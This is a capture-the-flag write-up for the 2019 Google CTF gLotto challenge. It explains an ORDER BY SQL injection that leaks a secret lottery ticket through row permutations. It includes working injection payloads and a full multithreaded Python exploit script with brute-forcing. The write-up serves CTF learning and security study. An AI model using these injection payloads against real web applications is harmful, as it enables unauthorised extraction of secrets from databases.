2019 Google CTF quals - gLotto
==============================

https://glotto.web.ctfcompetition.com/

Writeup by Tamás Hegedűs - !SpamAndHex


## TL;DR

We injected a piece of sql into the `order by` clauses that did not contain `rand()` and used all the permutations, all
the available `50.65` bits of output as a leak. The *"winning ticket"* was of `62.04` bits of pure entrophy, so had to
bruteforce the remaining `~11` bits. See [Appendix A](#appendix-a) for code.


---

On the page we are greeted by four tables with random-looking strings similar to each other, a "Check your ticket!"
button and a link to the [PHP source](https://glotto.web.ctfcompetition.com/?src) of the page itself. The program
generated a new 12 character long secret "lottery ticket" every time the page was visited or a ticket submission was 
attempted. If we guessed the token right the server would return the flag. So we had to squeeze all the leak into a
single query. It quickly caught our eyes that there is an obvious `order by` clause injection vulnerability in this
expression

    $db->query("SELECT * FROM {$tables[$i]} " . ($order != '' ? "ORDER BY `".$db->escape_string($order)."`" : ""))

where `$order` is a user-controlled variable, and the whole query is evaluated once for each of the four table. Even the
secret ticket was neatly put on the db session in a variable by `$db->query("SET @lotto = '$winner'");`. At this point
my friend @kt casually told me "oh I solved a very similar challenge on BitcoinCTF in 2014", and pointed me to a
presentation about [leaking information via an `order by` injection using rand](https://github.com/lukejahnke/talks/blob/master/Harder%20Better%20Faster%20Stronger%20-%20Ruxcon%202011.pdf)
It uses the fact that MySQL will initialize a deterministic pseudo-random generator with the given seed, and then take
the next pseudo-random value every time the expression is evaluated, and fortunately in the case of `order by` the
expression is evaluated once per row, in the order of the rows being read from the disk. So it is possible to put a
value we want to leak in the seed of a `rand()` expression, which in turn will generate exactly one deterministic float
value for each row, and then return the rows ordered by that value. By observing the resulting permutation it is
possible to determine a set of possible candidate original seeds. Of course it is very unlikely that there is no
collision between the permutations generated for different seeds, so there is some information loss.

So I had the PHP sources lying around, but I don't like digging in it, and I didn't like the idea of having a few bits
wasted by pure chance when we already have to bruteforce `11` bits. How much is the loss? Well I ran a quick test to
estimate it

    N = int(sympy.factorial(9))
    L = len(set(random.choice(range(N)) for i in range(N)))
    print("{} / {} = {}".format(L, N, L/N))

    # 228984 / 362880 = 0.6310185185185185

So we lost the uniqueness of around a third of the permutations by using `rand()`, that's like a third of the bits
leaked being lost! We cannot afford losing 17 more bits! There must be another way... (Spoiler alert: it's not the third
of the bits lost, and this reasoning is flawed in multiple assumptions, see [Appendix B](#appendix-b))

So I started to write an SQL expression that generates a unique permutation from an input integer, like
`1 -> '213456789'` . If I had have that expression I could have indexed into that value by the rowindex thus leaking the
permutation purely, without loss. So how do you get a row-index in MySQL? Turns out you don't, you declare a variable
and count them:

    # http://www.mysqltutorial.org/mysql-row_number/
    SET @row_number = 0;

    SELECT 
        (@row_number:=@row_number + 1) AS num, firstName, lastName
    FROM
        employees

Wait what? It is possible to mutate variables in queries per row? That means I don't have to write my `nth-permutation`
in a single expression, I can inject the algorithm itself!

```
mysql>

select *,
  substr(@l,1+mod(@b,@r),1),
  @l:=concat(substr(@l,1,mod(@b,@r)),substr(@l,2+mod(@b,@r))),
  @b:=@b div @r,
  @r:=@r-1,
  (select 1 from (select @l:=0x30313233343536373839,@r:=9,@b:=3246)x)
from april
;

+------------+--------------+--------------+-----------------+---------------+----------+-----------------+
| date       | winner       | substr(@l... | @l:=concat(s... | @b:=@b div @r | @r:=@r-1 | (select 1 fr... |
+------------+--------------+--------------+-----------------+---------------+----------+-----------------+
| 2019-03-01 | 4KYEC00RC5BZ | 6            | 012345789       |           360 |        8 |               1 |
| 2019-04-02 | 7AET1KPGKUG4 | 0            | 12345789        |            45 |        7 |               1 |
| 2019-04-06 | UDT5LEWRSWM9 | 4            | 1235789         |             6 |        6 |               1 |
| 2019-04-10 | OQQRH90KDJH1 | 1            | 235789          |             1 |        5 |               1 |
| 2019-04-12 | 2JTBMJW9HZOO | 3            | 25789           |             0 |        4 |               1 |
| 2019-04-14 | L4CY1JMRBEAW | 2            | 5789            |             0 |        3 |               1 |
| 2019-04-18 | 8DKYRPIO4QUW | 5            | 789             |             0 |        2 |               1 |
| 2019-04-22 | BFWQCWYK9VHJ | 7            | 89              |             0 |        1 |               1 |
| 2019-04-27 | 31OSKU57KV49 | 8            | 9               |             0 |        0 |               1 |
+------------+--------------+--------------+-----------------+---------------+----------+-----------------+
9 rows in set (0.00 sec)
```

Writing `0x30313233343536373839` instead of `'0123456789'` to bypass `$db->escape_string(...)`. So querying

    https://glotto.web.ctfcompetition.com/?order1=winner%60*0%2C(select%20concat(substr(%40l%2C1%2Bmod(%40b%2C%40r)%2C1)%2C%40l%3A%3Dconcat(substr(%40l%2C1%2Cmod(%40b%2C%40r))%2Csubstr(%40l%2C2%2Bmod(%40b%2C%40r)))%2C%40b%3A%3D%40b%20div%20%40r%2C%40r%3A%3D%40r-1)from(select%20%40l%3A%3D0x30313233343536373839%2C%40r%3A%3D9%2C%40b%3A%3D362879)x)%23

should give the longest table entirely reversed. And it does! So all left to do is to split and transform `@lotto` into
the right size inputs for the permutation.

The easiest way to convert a single character of the secret token to an integer in `range(36)` is `(ord(c)-22)%43`. By
combining 4 characters of the token we can get an integer in `range(36**4)`, which is enough to index any permutation
of 9 distinct elements, our longest table. That means, if the generated index falls into `range(fact(9))`, then we can
extract the input from the permutation. We can assume that the leak is from this range and calculate the characters of
the token. If the assumption was wrong then the whole procedure will give us a wrong token, and we can try again. The
rest of the tables require at least 3, 3, and 1 characters to be covered. So some information about 11 characters is
leaked, and we have no information of the last character at all, so I just assumed that it is an `A`, and started
bruteforcing. The PHP script did enforce a 5 second delay on wrong submissions, but that didn't prevent us from
firing up 30 threads. Soon we got our flag:

```
1603  BBN 4JAG EED E A You didn't win :(<br>The winning ticket was BBN4J2NE2OE4 BBN4JAGEEDEA
1608  44X CVPB R0B I A You didn't win :(<br>The winning ticket was 44XCVHJRCZ6E 44XCVPBR0BIA
1632  X8S OR1B HWC R A You won! CTF{3c2ca0d10a5d4bf44bc716d669e074b2} X8SOR1BHWCRA
1607  PLY 4O1F GZA I A You didn't win :(<br>The winning ticket was PLY4OTNGRIIJ PLY4O1FGZAIA
1609  QXC Q7AD 2QB S A You didn't win :(<br>The winning ticket was Q17Q7E82ENSB QXCQ7AD2QBSA
```


### Appendix A

```python3
from collections import OrderedDict
import requests
from bs4 import BeautifulSoup
import threading
import itertools
import time

"""
Idea:

select *,
substr(@l,1+mod(@b,@r),1),
@l:=concat(substr(@l,1,mod(@b,@r)),substr(@l,2+mod(@b,@r))),
@b:=@b div @r,
@r:=@r-1,
(select 1 from (select @l:=0x30313233343536373839,@r:=9,@b:=0)x)
from april
;

"""

def main():
    index = itertools.count()
    
    def executor():
        session = requests.Session()
        if session is None:
            session = requests.Session()
            session_store.session = session
        while 1:
            my_index = next(index)
            if my_index > 2000:
                break
            leak = do_leak(session)
            code = leak.replace(" ", "")
            resp = session.post("https://glotto.web.ctfcompetition.com/", data={"code":code})
            flag = resp.text.strip()
            print(my_index, leak, flag, code)


    threads = [threading.Thread(target=executor) for i in range(30)]
    for thread in threads:
        thread.start()
        time.sleep(0.3)
    for thread in threads:
        thread.join()


def unpermute(x):
    x = [int(e) for e in x]
    r = 0
    base = 1
    N = len(x)
    for i in range(N):
        idx = x.index(i)
        if idx < 0:
            raise KeyError()
        x = x[:idx] + x[idx+1:]
        r += base * idx
        base *= N - i
    return r


def extract(i):
    return "mod(ord(substr(@lotto,{},1))-22,43)".format(i+1)


def extract_range(a, b):
    r = ""
    for i,v in enumerate(range(a, b)):
        if i > 0:
            r += "+{}*".format(36**i)
        r += extract(v)
    return r


def leaked_range_to_str(leak, length):
    return "".join(LEAK_TO_CHAR[leak//(36**e)%36] for e in range(length))


def do_leak(session):
    EXPR_TO_LEAK = {
        "march": (3, gensql(8, extract_range(0, 3))),
        "april": (4, gensql(9, extract_range(3, 7))),
        "may": (3, gensql(7, extract_range(7, 10))),
        "june": (1, gensql(4, extract_range(10, 11))),
    }
    params = OrderedDict()
    
    for index, (month, data) in enumerate(DATA.items()):
        params["order{}".format(index)] = EXPR_TO_LEAK[month][1]
    resp = session.get("https://glotto.web.ctfcompetition.com/", params=params)
    soup = BeautifulSoup(resp.text, 'html.parser')
    
    leaked_output = OrderedDict(
        (
            table.select("div.panel-heading")[0].text,
            [row.text for row in table.select("tr td:nth-child(2)")]
        )
        for table in soup.select("div.panel.panel-default")
    )
    
    result = ""
    for month, data in DATA.items():
        leaked_range = unpermute_output(leaked_output[month], month)
        result += " " + leaked_range_to_str(leaked_range, EXPR_TO_LEAK[month][0])
    result += " A"
    return result


def unpermute_output(codes, month):
    indices = {x:i for i,x in enumerate(x[1] for x in DATA[month])}
    return unpermute([indices[w] for w in codes])


def gensql(row_count, expr_to_leak):
    return """winner`*0,
(select concat(
substr(@l,1+mod(@b,@r),1),
@l:=concat(substr(@l,1,mod(@b,@r)),substr(@l,2+mod(@b,@r))),
@b:=@b div @r,
@r:=@r-1
)from(select @l:=0x30313233343536373839,@r:={},@b:={})x)
#
""".replace("\n", "").format(row_count, expr_to_leak)
CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
LEAK_TO_CHAR = {(ord(c)-22)%43:c for c in CHARSET}

DATA = OrderedDict([
    ("march", (
        ('2019-03-01', 'CA5G8VIB6UC9'),
        ('2019-03-05', '01VJNN9RHJAC'),
        ('2019-03-10', '1WSNL48OLSAJ'),
        ('2019-03-13', 'UN683EI26G56'),
        ('2019-03-18', 'YYKCXJKAK3KV'),
        ('2019-03-23', '00HE2T21U15H'),
        ('2019-03-28', 'D5VBHEDB9YGF'),
        ('2019-03-30', 'I6I8UV5Q64L0'),
    )),
    ("april", (
        ('2019-03-01', '4KYEC00RC5BZ'),
        ('2019-04-02', '7AET1KPGKUG4'),
        ('2019-04-06', 'UDT5LEWRSWM9'),
        ('2019-04-10', 'OQQRH90KDJH1'),
        ('2019-04-12', '2JTBMJW9HZOO'),
        ('2019-04-14', 'L4CY1JMRBEAW'),
        ('2019-04-18', '8DKYRPIO4QUW'),
        ('2019-04-22', 'BFWQCWYK9VHJ'),
        ('2019-04-27', '31OSKU57KV49'),
    )),
    ("may", (
        ('2019-03-01', 'O3QZ2P6JNSSA'),
        ('2019-05-04', 'PQ8ZW6TI1JH7'),
        ('2019-05-09', 'OWGVFW0XPLHE'),
        ('2019-05-10', 'OMZRJWA7WWBC'),
        ('2019-05-16', 'KRRNDWFFIB08'),
        ('2019-05-20', 'ZJR7ANXVBLEF'),
        ('2019-05-25', '8GAB09Z4Q88A'),
    )),
    ("june", (
        ('2019-03-01', '1JJL716ATSCZ'),
        ('2019-06-04', 'YELDF36F4TW7'),
        ('2019-06-08', 'WXRJP8D4KKJQ'),
        ('2019-06-22', 'G0O9L3XPS3IR'),
    ))
])


if __name__ == "__main__":
    main()
```


### Appendix B

What is the expected "efficiency" of using `rand()` for leaking through permutations? It is like randomly assigning a
possible *output* to each *input*, and counting the distinct values assigned. It is the expected count of distinct
values observed from a uniformly random combination with replacement of `K` items from a pool of `N`, where `N` is the
count of all possible permutations and `K` is the count of all possible inputs, call it `E_Nk(N, K)`. This
[math.stackexchange](https://math.stackexchange.com/a/72229/301841) has the formula:

    E_Nk(N, K) = (1 - (1 - 1/N)**K) / (1 - (1 - 1/N))

For a large seed size `K = N` it is around `1 - 1/e ~= 0.63212`, close to the value empirically measured before. So how
much information is leaked? If there are `N` possible outcomes then we can say `log2(N)` bits are leaked. If the number
of possible outcomes is reduced to 63% by this "noise", then we have `log2(N * 0.63212) ~ log2(N) - 0.6617` bits leaked.
So it is not third of the bits lost, its around `2/3` of a single bit lost per each table or `~2.66` bits per request,
which makes us being short by a total of `11 + 2.66 = 13.66` bits. Not great, not terrible. 1 of `2 ** 13.66 = 12944`
attemts would be successful, still bruteforceable. I am still glad I went with the more pure solution where I could get
a right answer per every `2000` attempts.

In the above logic we fed just as many bits into our random permutation as we wanted to get out. But in reality nothing
prevents us from feeding much more bits into it, making it leaking more and more bits, increasing our efficiency! In
fact, we could even feed the whole token into the `rand` as seed for each table, and then correlate all four tables to
get a set of possible tokens resulting in these four permutations. I did not think much about it, this seems to require
enormus lookup tables, but in theory we should be able to get close to a leak of all possible `50.65` bits. It is also
sensitive to the implementation of `rand()`, an algorithm with a small internal state of `32` bits would ruin the
exploit.
